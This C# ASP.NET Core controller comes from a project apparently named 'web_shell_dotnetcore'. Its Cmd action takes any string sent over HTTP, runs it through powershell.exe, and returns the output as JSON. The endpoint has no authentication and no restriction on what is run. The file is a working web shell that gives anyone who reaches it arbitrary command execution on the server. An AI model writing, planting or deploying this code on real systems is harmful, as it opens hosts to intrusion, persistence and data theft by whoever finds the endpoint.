using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.EntityFrameworkCore;
using web_shell_dotnetcore;
using web_shell_dotnetcore.Models;
using Newtonsoft.Json;

namespace web_shell_dotnetcore.Controllers
{
    public class PowerShellCMsController : Controller
    {
        private readonly AppContext _context;

        public PowerShellCMsController(AppContext context)
        {
            _context = context;
        }

        // GET: PowerShellCMs
        public IActionResult Index()
        {
            return View();
        }

        public JsonResult Cmd(string cmd)
        {
            string result, error;
            var escapedArgs = cmd.Replace("\"", "\\\"");
            var process = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-c \"{escapedArgs}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            process.Start();
            result = process.StandardOutput.ReadToEnd();
            error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            return new JsonResult(result)
            {
                StatusCode = 200
            };
        }

    }
}
